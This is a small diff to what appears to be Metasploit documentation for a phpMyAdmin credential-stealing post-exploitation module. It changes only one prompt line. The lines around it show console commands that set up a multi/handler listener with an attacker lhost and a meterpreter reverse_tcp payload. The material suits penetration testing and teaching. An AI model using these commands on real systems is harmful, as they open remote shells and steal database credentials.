@@ -15,7 +15,7 @@ This post module gathers PhpMyAdmin Creds from target Linux machine.
 ## Scenarios
 
 ```
-msf5 post(linux/gather/phpmyadmin_credsteal) > use multi/handler
+msf5 > use multi/handler
 msf5 exploit(multi/handler) > set lhost 192.168.37.1
 lhost => 192.168.37.1
 msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
